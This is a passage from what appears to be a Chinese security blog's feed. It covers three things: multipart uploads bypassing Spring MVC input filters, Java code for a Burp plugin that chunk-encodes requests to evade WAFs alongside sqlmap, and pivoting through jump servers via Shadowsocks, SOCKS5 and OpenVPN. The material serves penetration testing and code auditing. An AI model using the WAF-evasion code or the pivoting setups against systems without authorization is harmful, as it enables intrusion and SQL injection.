MVC针对Tomcat解析的结果—原生<code>HttpServletRequest</code>，使用<code>common-fileupload.jar</code>来继续解析，得到<code>MultipartHttpServletRequest</code>的实现对象。<code>DefaultMultipartHttpServletRequest</code>类实现了<code>MultipartHttpServletRequest</code>，故通过该类的<code>getParameterValues()</code>方法即可获取到上传POST请求的参数值！</p><p><strong>最后特别说明一点，其实上传POST请求数据是流经过过滤器的。没有被过滤，是由于获取参数值的时候，没有调用过滤器Wrapper对象的方法。所以最终我们看到了上传包可以“绕过”过滤器检查的现象。</strong></p><h2 id="0x05-最后的思考"><a href="#0x05-最后的思考" class="headerlink" title="0x05 最后的思考"></a>0x05 最后的思考</h2><p>在文章发布区，评论区，公告区….等功能点上常常需要上传图片或附件，这时表单往往会以上传包的形式提交数据。而这些功能点也是hack们最关注的XSS漏洞测试点，若不注意上传包可”绕过”过滤器的问题，会造成很严重的后果！</p><p>我从新翻开了之前审计的项目代码，发现很多Spring MVC项目都是使用过滤器对XSS和SQL注入进行全局防御。而过滤器的代码与本文例子的中过滤器代码相似，很明显都是从网上Copy过来的。这样编写代码是存在问题的，针对这种情况，我们该如何正确防御，我们下周文章详述！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-背景说明&quot;&gt;&lt;a href=&quot;#0x01-背景说明&quot; class=&quot;headerlink&quot; title=&quot;0x01 背景说明&quot;&gt;&lt;/a&gt;0x01 背景说明&lt;/h2&gt;&lt;p&gt;月初和southwind0师傅做代码审计时，发现了一个比较奇葩的问题。系统设置了全局
      
    
    </summary>
    
      <category term="代码审计" scheme="http://gv7.me/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
  </entry>
  
  <entry>
    <title>编写Burp分块传输插件绕WAF</title>
    <link href="http://gv7.me/articles/2019/chunked-coding-converter/"/>
    <id>http://gv7.me/articles/2019/chunked-coding-converter/</id>
    <published>2019-03-15T02:37:13.000Z</published>
    <updated>2019-12-16T17:37:02.680Z</updated>
    
    <content type="html"><![CDATA[<p>分块传输绕WAF在年初的<a href="https://www.anquanke.com/post/id/169738" target="_blank" rel="noopener">《利用分块传输吊打所有WAF》</a>中学习到了，不过没有深入研究。最近在T00ls上看到大佬们在编写sqlmap的tamp脚本，过程中遇到了比较难解决的一个问题，对sqlmap数据包加入<code>Transfer-Encoding: chunked</code>HTTP头。本周尝试通过编写Burp插件来解决这个问题，同时也为了方便在Burp上快速测试分块传输是否能绕过waf。我们开始吧！</p><a id="more"></a><h2 id="0x01-功能设计"><a href="#0x01-功能设计" class="headerlink" title="0x01 功能设计"></a>0x01 功能设计</h2><p>我们先来看看插件要实现的功能</p><ol><li>在Burp Repeater套件上可对数据包进行快速chunked解码编码</li><li>自动化对Burp的Proxy，scanner，spider等套件的数据包进行编码</li><li>可设置分块长度，是否开启注释</li></ol><h2 id="0x02-编写代码"><a href="#0x02-编写代码" class="headerlink" title="0x02 编写代码"></a>0x02 编写代码</h2><p>限于边幅，我只说明核心函数，并通过注释的方式解释代码的相关功能。</p><h4 id="2-1-编码函数"><a href="#2-1-编码函数" class="headerlink" title="2.1 编码函数"></a>2.1 编码函数</h4><p>这是我们的核心函数，对各个套件数据HTTP数据进行<code>chunked</code>编码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span>  <span class="keyword">byte</span>[] encoding(IExtensionHelpers helpers, IHttpRequestResponse requestResponse, <span class="keyword">int</span> split_len, <span class="keyword">boolean</span> isComment) <span class="keyword">throws</span> UnsupportedEncodingException &#123;</span><br><span class="line"><span class="keyword">byte</span>[] request = requestResponse.getRequest();</span><br><span class="line">IRequestInfo requestInfo = helpers.analyzeRequest(request);</span><br><span class="line"><span class="keyword">int</span> bodyOffset = requestInfo.getBodyOffset();</span><br><span class="line"><span class="keyword">int</span> body_length = request.length - bodyOffset;</span><br><span class="line">String body = <span class="keyword">new</span> String(request, bodyOffset, body_length, <span class="string">"UTF-8"</span>);</span><br><span class="line"><span class="comment">// 对长度大于10000的数据包，不处理</span></span><br><span class="line"><span class="keyword">if</span> (request.length - bodyOffset &gt; <span class="number">10000</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> request;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对数据包进行编码处理</span></span><br><span class="line">List&lt;String&gt; str_list = Util.getStrList(body,Config.splite_len);</span><br><span class="line">String encoding_body = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span>(String str:str_list)&#123;</span><br><span class="line"><span class="keyword">if</span>(Config.isComment)&#123;</span><br><span class="line">encoding_body += String.format(<span class="string">"%s;%s"</span>,Util.decimalToHex(str.length()),Util.getRandomString(<span class="number">10</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">encoding_body += Util.decimalToHex(str.length());</span><br><span class="line">&#125;</span><br><span class="line">encoding_body += <span class="string">"\r\n"</span>;</span><br><span class="line">encoding_body += str;</span><br><span class="line">encoding_body += <span class="string">"\r\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line">encoding_body += <span class="string">"0\r\n\r\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在数据包中添加Transfer-Encoding: chunked头</span></span><br><span class="line">List&lt;String&gt; headers = helpers.analyzeRequest(request).getHeaders();</span><br><span class="line">Iterator&lt;String&gt; iter = headers.iterator();</span><br><span class="line"><span class="keyword">while</span> (iter.hasNext()) &#123;</span><br><span class="line"><span class="keyword">if</span> (((String)iter.next()).contains(<span class="string">"Transfer-Encoding"</span>)) &#123;</span><br><span class="line">iter.remove();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">headers.add(<span class="string">"Transfer-Encoding: chunked"</span>);</span><br><span class="line"><span class="keyword">return</span> helpers.buildHttpMessage(headers,encoding_body.getBytes());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自动编码其他模块的数据包，我们可以通过实现Burp的<code>IHttpListener</code>，<code>IProxyListener</code>这两个接口，分别实现<code>processHttpMessage()</code>，<code>processProxyMessage()</code>这两个方法。</p><p>这里注意一个问题，Burp的所有模块的HTTP流量都会经过<code>IHttpListener.processHttpMessage()</code>这个方法，但是如果在这里处理数据包的话，Burp Proxy模块的数据包被修改之后,不会在Proxy套件UI界面显示修改后的流量，故Proxy模块流量处理单独使用<code>IProxyListener.processProxyMessage()</code>。</p><h4 id="2-2-自动编码Proxy套件的流量"><a href="#2-2-自动编码Proxy套件的流量" class="headerlink" title="2.2 自动编码Proxy套件的流量"></a>2.2 自动编码Proxy套件的流量</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processProxyMessage</span><span class="params">(<span class="keyword">final</span> <span class="keyword">boolean</span> messageIsRequest, <span class="keyword">final</span> IInterceptedProxyMessage proxyMessage)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(messageIsRequest &amp;&amp; isValidTool(IBurpExtenderCallbacks.TOOL_PROXY))&#123;</span><br><span class="line">IHttpRequestResponse messageInfo = proxyMessage.getMessageInfo();</span><br><span class="line">IRequestInfo reqInfo = helpers.analyzeRequest(messageInfo.getRequest());</span><br><span class="line"><span class="comment">//只对Content-Typt头为application/x-www-form-urlencode的POST包进行编码</span></span><br><span class="line"><span class="keyword">if</span>(reqInfo.getMethod().equals(<span class="string">"POST"</span>) &amp;&amp; reqInfo.getContentType() == IRequestInfo.CONTENT_TYPE_URL_ENCODED)&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//使用encoding方法对原请求包进行chunked编码</span></span><br><span class="line"><span class="keyword">byte</span>[] request = Transfer.encoding(helpers, messageInfo, Config.splite_len,Config.isComment);</span><br><span class="line"><span class="keyword">if</span> (request != <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="comment">//将原HTTP请求包替换为chunked编码后的请求包</span></span><br><span class="line">messageInfo.setRequest(request);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">stderr.println(e.getMessage());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-3-自动编码Proxy之外的套件（Intruder，scanner…）流量"><a href="#2-3-自动编码Proxy之外的套件（Intruder，scanner…）流量" class="headerlink" title="2.3 自动编码Proxy之外的套件（Intruder，scanner…）流量"></a>2.3 自动编码Proxy之外的套件（Intruder，scanner…）流量</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processHttpMessage</span><span class="params">(<span class="keyword">int</span> toolFlag, <span class="keyword">boolean</span> messageIsRequest, IHttpRequestResponse messageInfo)</span> </span>&#123;</span><br><span class="line"><span class="comment">//Proxy套件流量不处理，否则会出现两次编码问题，其余套件均在这里处理。</span></span><br><span class="line"><span class="keyword">if</span>(messageIsRequest &amp;&amp; isValidTool(toolFlag) &amp;&amp; (toolFlag != IBurpExtenderCallbacks.TOOL_PROXY))&#123;</span><br><span class="line">IRequestInfo reqInfo = helpers.analyzeRequest(messageInfo.getRequest());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(reqInfo.getMethod().equals(<span class="string">"POST"</span>) &amp;&amp; reqInfo.getContentType() == IRequestInfo.CONTENT_TYPE_URL_ENCODED)&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">byte</span>[] request = Transfer.encoding(helpers, messageInfo, Config.splite_len,Config.isComment);</span><br><span class="line"><span class="keyword">if</span> (request != <span class="keyword">null</span>) &#123;</span><br><span class="line">messageInfo.setRequest(request);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">stderr.println(e.getMessage());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整的代码，已经上传github，地址如下：</p><p><a href="http://github.com/c0ny1/chunked-coding-converter" target="_blank" rel="noopener">http://github.com/c0ny1/chunked-coding-converter</a></p><h2 id="0x03-效果演示"><a href="#0x03-效果演示" class="headerlink" title="0x03 效果演示"></a>0x03 效果演示</h2><h4 id="3-1-演示一：快速编码解码"><a href="#3-1-演示一：快速编码解码" class="headerlink" title="3.1 演示一：快速编码解码"></a>3.1 演示一：快速编码解码</h4><p>在Burp repeater套件可以快速对请求内容进行chunked编码解码，来对WAF进行测试。</p><p><img src="/articles/2019/chunked-coding-converter/repeater-chunked-coding.gif" alt="快速编码解码对WAF进行测试"></p><h4 id="3-2-演示二：搭配sqlmap进行sql注入"><a href="#3-2-演示二：搭配sqlmap进行sql注入" class="headerlink" title="3.2 演示二：搭配sqlmap进行sql注入"></a>3.2 演示二：搭配sqlmap进行sql注入</h4><p>sqlmap代理到Burp中，插件对Proxy套件的流量进行编码处理，来绕过waf。</p><p><img src="/articles/2019/chunked-coding-converter/sqlmap-bypassWAF.gif" alt="搭配sqlmap绕waf"></p><h2 id="0x04-参考文章"><a href="#0x04-参考文章" class="headerlink" title="0x04 参考文章"></a>0x04 参考文章</h2><ul><li><a href="https://www.anquanke.com/post/id/169738" target="_blank" rel="noopener">利用分块传输吊打所有WAF</a></li><li><a href="https://www.freebuf.com/news/193659.html" target="_blank" rel="noopener">在HTTP协议层面绕过WAF</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;分块传输绕WAF在年初的&lt;a href=&quot;https://www.anquanke.com/post/id/169738&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;《利用分块传输吊打所有WAF》&lt;/a&gt;中学习到了，不过没有深入研究。最近在T00ls上看到大佬们在编写sqlmap的tamp脚本，过程中遇到了比较难解决的一个问题，对sqlmap数据包加入&lt;code&gt;Transfer-Encoding: chunked&lt;/code&gt;HTTP头。本周尝试通过编写Burp插件来解决这个问题，同时也为了方便在Burp上快速测试分块传输是否能绕过waf。我们开始吧！&lt;/p&gt;
    
    </summary>
    
      <category term="安全开发" scheme="http://gv7.me/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="burp" scheme="http://gv7.me/tags/burp/"/>
    
  </entry>
  
  <entry>
    <title>突破内网渗透中的访问策略限制</title>
    <link href="http://gv7.me/articles/2019/break-through-lan-segment-limit/"/>
    <id>http://gv7.me/articles/2019/break-through-lan-segment-limit/</id>
    <published>2019-02-25T10:50:11.000Z</published>
    <updated>2019-03-15T03:38:31.000Z</updated>
    
    <content type="html"><![CDATA[<p>在内网做渗透测试时，常常遇到访问策略限制，无法直接访问渗透目标。本文算是记录下我上一年的几个解决方案。</p><h2 id="0x01-场景说明"><a href="#0x01-场景说明" class="headerlink" title="0x01 场景说明"></a>0x01 场景说明</h2><p>在做安服驻场时，连入客户内网对另一网段的站点进行渗透。有可能会遇到这种情况，虽然连入了客户内网，但无法直接访问目标站点。因为客户内网做了访问策略限制，不同网段无法直接连通。往往需要通过客户提供的跳板服务器去访问，大概的网络示意图如下：</p><p><img src="/articles/2019/break-through-lan-segment-limit/network.png" alt="网络示意图"></p><p>我们当然可以在跳板服务器上装好java环境，方便运行比配的Burp Suite。安装python环境，运行常用的渗透辅助脚本。同时如果你还需要其他工具，得一个一个复制到服务器上……这将非常的繁琐！</p><p><strong>那不能通过某种方法可以使得我们的笔记本直接访问的目标站点呢？</strong>，这样就不用拷贝工具到服务器上了，毕竟还是自己的笔记本渗透舒适。本文就是用于解决这个问题。</p><h2 id="0x02-方案一-HTTP代理"><a href="#0x02-方案一-HTTP代理" class="headerlink" title="0x02 方案一: HTTP代理"></a>0x02 方案一: HTTP代理</h2><h3 id="2-1-跳板服务器配置"><a href="#2-1-跳板服务器配置" class="headerlink" title="2.1 跳板服务器配置"></a>2.1 跳板服务器配置</h3><p>在跳板服务器上搭建Http(s)代理服务器，由于比较简单，就不具体说明如何搭建了。</p><h3 id="2-2-笔记本配置"><a href="#2-2-笔记本配置" class="headerlink" title="2.2 笔记本配置"></a>2.2 笔记本配置</h3><p>在客户端的浏览器上配置好代理，即可访问目标站点了。</p><h3 id="2-3-方案缺点"><a href="#2-3-方案缺点" class="headerlink" title="2.3 方案缺点"></a>2.3 方案缺点</h3><p>只能支持Http协议数据的转发，无法代理其他协议。导致我们无法测试目标站点的其他端口。下个方案我们来解决这个问题。</p><h2 id="0x03-方案二：Shadowsocks"><a href="#0x03-方案二：Shadowsocks" class="headerlink" title="0x03 方案二：Shadowsocks"></a>0x03 方案二：Shadowsocks</h2><p>我们往往都是使用Shadowsocks来FQ，其实这种场景也是可以利用<code>Shadowsocks</code>来解决的。</p><h3 id="3-1-跳板服务器配置"><a href="#3-1-跳板服务器配置" class="headerlink" title="3.1 跳板服务器配置"></a>3.1 跳板服务器配置</h3><p>Shadowsocks有python版，nodejs版，go版和exe版。由于我们得到的跳板机一般为Windows，故这里选择绿色单exe版Shadowsocks,方便携带移动。下载地址如下：</p><p><a href="https://github.com/shadowsocks/libQtShadowsocks" target="_blank" rel="noopener">https://github.com/shadowsocks/libQtShadowsocks</a></p><p>新建以下两个文件，内容分别如下：</p><p><strong>shadowsock.json</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">"server"</span>:<span class="string">"0.0.0.0"</span>,</span><br><span class="line"><span class="attr">"server_port"</span>:<span class="number">8388</span>,</span><br><span class="line"><span class="attr">"local_address"</span>:<span class="string">"127.0.0.1"</span>,</span><br><span class="line"><span class="attr">"local_port"</span>:<span class="number">1080</span>,</span><br><span class="line"><span class="attr">"password"</span>:<span class="string">"123456"</span>,</span><br><span class="line"><span class="attr">"timeout"</span>:<span class="number">300</span>,</span><br><span class="line"><span class="attr">"method"</span>:<span class="string">"aes-256-cfb"</span>,</span><br><span class="line"><span class="attr">"fast_open"</span>:<span class="literal">false</span>,</span><br><span class="line"><span class="attr">"workers"</span>: <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>shadowsock-server.bat</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">shadowsocks-libqss.exe -c config.json -S</span><br></pre></td></tr></table></figure><p>将以上两个文件放到与<code>shadowsocks-libqss.exe</code>文件同目录，双击运行该bat脚本，即可在服务器上一键启动Shadowsocks了！</p><h3 id="3-2-笔记本配置"><a href="#3-2-笔记本配置" class="headerlink" title="3.2 笔记本配置"></a>3.2 笔记本配置</h3><p>在我们的笔记本Shadowsocks客户端进行如下设置，即可连接到Shadowsocks服务器。</p><p><img src="/articles/2019/break-through-lan-segment-limit/shadowsock-client-config.png" alt="ss客户端配置"></p><p>在渗透时只需要将浏览器,burp等工具代理到<code>127.0.0.1:1080</code>，即可访问到我们的目标站点了。</p><p>注意：只有实现了http(s)/socks5功能或者使用系统代理的工具才能使用Shadowsocks！</p><h3 id="3-3-方案缺点"><a href="#3-3-方案缺点" class="headerlink" title="3.3 方案缺点"></a>3.3 方案缺点</h3><p>如果某个渗透测试工具本身没有http(s)/socks5代理功能，那该怎么办？也许有的朋友可能会想到使用<code>Proxifier/Sockcap</code>这类软件，来为这些软件进程“添加”代理功能。但是由于ss需要在本地有客户端，故在本地再使用Proxifier/Sockcap会出现流量传输死循环的情况。下个方案我们来解决这个问题。</p><h2 id="0x04-方案三：SOCKS5代理-Proxifier-Sockcap"><a href="#0x04-方案三：SOCKS5代理-Proxifier-Sockcap" class="headerlink" title="0x04 方案三：SOCKS5代理+Proxifier/Sockcap"></a>0x04 方案三：SOCKS5代理+Proxifier/Sockcap</h2><h3 id="4-1-跳板服务器配置"><a href="#4-1-跳板服务器配置" class="headerlink" title="4.1 跳板服务器配置"></a>4.1 跳板服务器配置</h3><p>这里我们使用绿色单exe版SOCKS5代理服务器软件goproxy，项目地址如下：</p><p><a href="https://github.com/snail007/goproxy" target="_blank" rel="noopener">https://github.com/snail007/goproxy</a></p><p>在跳板服务器上，使用以下命令即可快速启动SOCKS5代理服务。</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxy.exe socks -t tcp -p "<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">38080</span>"</span><br></pre></td></tr></table></figure><h3 id="4-2-笔记本配置"><a href="#4-2-笔记本配置" class="headerlink" title="4.2 笔记本配置"></a>4.2 笔记本配置</h3><p>在本机使用Proxifier将需要代理的工具设置好代理，当然如果该工具有代理功能就不用了。</p><p><img src="/articles/2019/break-through-lan-segment-limit/add-socks5-server.png" alt="添加代理服务器"></p><p><img src="/articles/2019/break-through-lan-segment-limit/add-proxy-rules.png" alt="添加代理规则"></p><h3 id="4-3-方案缺点"><a href="#4-3-方案缺点" class="headerlink" title="4.3 方案缺点"></a>4.3 方案缺点</h3><ol><li>渗透中需要使用的工具，我们得一一为它们设置好代理，比较繁琐。</li><li>有些工具，你为它设置代理后，依然不能用，比如nmap。</li></ol><p>下个方案我们来解决这些问题。</p><h2 id="0x05-方案四：VPN"><a href="#0x05-方案四：VPN" class="headerlink" title="0x05 方案四：VPN"></a>0x05 方案四：VPN</h2><p>以上方案，优点很明显，缺点也很明显。为了实现对目标站点的全端口渗透无疑最好的方案是将跳板服务器搭建成VPN服务器了，然后笔记本直接通过VPN来访问目标站点，其他无需设置。即可使得所有工具都能访问到目标站点服务器的所有端口。</p><h3 id="5-1下载安装"><a href="#5-1下载安装" class="headerlink" title="5.1下载安装"></a>5.1下载安装</h3><p>去官网下载OpenVPN(我下载是openvpn-install-2.3.10-I601-x86_64.exe)，并在客户端和服务器按照以下同样的方式安装OpenVPN。安装过程没啥好说的，主要注意到以下这一步时，要选择红方框中的两个选项，不然安装完无法使用命令行制作证书。</p><p><img src="/articles/2019/break-through-lan-segment-limit/install-setting.png" alt="OpenVPN安装时需要选择的两项"></p><p>安装完成后系统会多出一张网卡TAP-Windows Adapter V9。</p><h3 id="5-2-系统设置"><a href="#5-2-系统设置" class="headerlink" title="5.2 系统设置"></a>5.2 系统设置</h3><p>设置跳板服务器用于访问目标站点的网卡共享给OpenVPN的虚拟网卡<code>TAP-Windows Adapter V9</code>，这步很重要！</p><p><img src="/articles/2019/break-through-lan-segment-limit/shared-network-card.png" alt="设置网卡共享"></p><p>网上说需要修改注册表，测试发现不改也行，这里做个记录，说不定有的环境需要。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters</span><br><span class="line">将IPEnableRouter改为1</span><br></pre></td></tr></table></figure><h3 id="5-3-生成VPN证书"><a href="#5-3-生成VPN证书" class="headerlink" title="5.3 生成VPN证书"></a>5.3 生成VPN证书</h3><p><strong>&lt;1&gt; 初始化配置</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">init-config</span><br></pre></td></tr></table></figure><p><strong>&lt;2&gt; 复制配置文件为批处理</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vars</span><br></pre></td></tr></table></figure><p><strong>&lt;3&gt; 清除key文件夹内的文件,文件夹不存在会自动创建</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clean-all</span><br></pre></td></tr></table></figure><p><strong>&lt;4&gt; 生成证书及key，需要填写一些参数，建议不要默认</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">build-ca</span><br></pre></td></tr></table></figure><p><strong>&lt;5&gt; 创建服务端证书及key，需要填写一些参数，建议不要默认，一路选y</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">build-key-server server</span><br></pre></td></tr></table></figure><p><strong>&lt;6&gt; 创建一个客户端证书及key，需要填写一些参数，建议不要默认,一路选y</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">build-key client</span><br></pre></td></tr></table></figure><p><strong>&lt;7&gt; 生成1024bit的key（pem文件），并结束此次创建</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">build-dh</span><br></pre></td></tr></table></figure><p>将新生成的<code>keys</code>目录下所有文件，全部拷贝到服务器OpenVPN的config目录下，<br>将keys目录下的<code>client1.crt</code>,<code>client1.key</code>和<code>ca.crt</code>复制到客户端的OpenVPN的config目录下。</p><h3 id="5-4-编写服务端和客户端连接配置文件"><a href="#5-4-编写服务端和客户端连接配置文件" class="headerlink" title="5.4 编写服务端和客户端连接配置文件"></a>5.4 编写服务端和客户端连接配置文件</h3><p>在服务器上，在OpenVPN的sample-config目录下复制一个<code>server.ovpn</code>配置模板文件，到config目录。以下列举的为需要修改的配置项，其他可以使用默认配置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># VPN服务器的地址</span></span><br><span class="line">local <span class="number">192.168</span><span class="number">.149</span><span class="number">.140</span></span><br><span class="line"><span class="comment"># 使用tcp协议</span></span><br><span class="line">proto tcp</span><br><span class="line"><span class="comment"># 将目标站点所在的网段，写成路由推送给VPN客户端</span></span><br><span class="line">push <span class="string">"route 10.0.3.0 255.255.255.0"</span></span><br><span class="line"><span class="comment"># 给VPN客户端推送的DNS（在内网一般不用写）</span></span><br><span class="line">push <span class="string">"dhcp-option DNS 114.114.114.114"</span></span><br><span class="line"><span class="comment"># build-dh命令生成的是1024位的pem文件</span></span><br><span class="line">dh dh1024.pem</span><br></pre></td></tr></table></figure><p>在客户端，在OpenVPN的<code>sample-config</code>目录下复制一个<code>client.ovpn</code>配置模板文件，到<code>config</code>目录。以下列举的为需要修改的配置项，其他可以使用默认配置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 远程VPN服务器地址</span></span><br><span class="line">remote <span class="number">192.168</span><span class="number">.149</span><span class="number">.140</span> <span class="number">1194</span></span><br><span class="line"><span class="comment"># 使用TCP协议，与服务端相同</span></span><br><span class="line">proto tcp</span><br></pre></td></tr></table></figure><p>最后先启动服务器端，右键托盘图标&gt;connect，小图标变绿色代表启动成功，若不成功可以查看下log日志，排查下原因。然后再启动客户端，操作一致。</p><h3 id="5-5-方案缺点"><a href="#5-5-方案缺点" class="headerlink" title="5.5 方案缺点"></a>5.5 方案缺点</h3><p>配置相对比较繁琐。</p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>这些方案我特意选择了比较简单易用的软件，并作了一个记录。方便自己某时需要，能快速突破限制，节省渗透时间。同时解决方案中推荐的软件在Linux上也有，搭建的方式类似。每个方案有优点也有缺点，大家要看自己在现场的实际需求来选择！</p><h2 id="0x07-参考文章"><a href="#0x07-参考文章" class="headerlink" title="0x07 参考文章"></a>0x07 参考文章</h2><ul><li><a href="https://www.librehat.com/three-minutes-to-set-up-shadowsocks-server-on-windows/" target="_blank" rel="noopener">Windows下三分钟搭建Shadowoscks服务器端</a></li><li><a href="https://www.i5seo.com/shadowsocks-sock5-pac-vpn-difference-between.html" target="_blank" rel="noopener">Shadowsocks（Sock5代理）的PAC模式与全局模式与VPN的区别</a></li><li><a href="http://www.fyluo.com/m/?post=198" target="_blank" rel="noopener">OpenVPN Windows 平台安装部署教程</a></li><li><a href="https://www.landui.com/help/show-3871.html" target="_blank" rel="noopener">windows下利用OpenVPN搭建VPN服务器</a></li><li><a href="https://www.cnblogs.com/lidabo/p/7027463.html" target="_blank" rel="noopener">OpenVPN 安装、配置客户端和服务端，以及OpenVPN的使用 (Windows 平台)</a></li><li><a href="https://www.cnblogs.com/EasonJim/p/9657039.html" target="_blank" rel="noopener">OpenVPN搭建中tap与tun的实际使用区别</a></li><li><a href="http://blog.shell909090.org/blog/archives/2724/" target="_blank" rel="noopener">openvpn的几种基本模式</a></li><li><a href="https://www.ilanni.com/?p=9847" target="_blank" rel="noopener">烂泥：openvpn配置文件详解</a></li><li><a href="https://www.ilanni.com/?p=9877" target="_blank" rel="noopener">烂泥：openvpn tun模式下客户端与内网机器通信</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在内网做渗透测试时，常常遇到访问策略限制，无法直接访问渗透目标。本文算是记录下我上一年的几个解决方案。&lt;/p&gt;
&lt;h2 id=&quot;0x01-场景说明&quot;&gt;&lt;a href=&quot;#0x01-场景说明&quot; class=&quot;headerlink&quot; title=&quot;0x01 场景说明&quot;&gt;&lt;/a&gt;
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://gv7.me/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
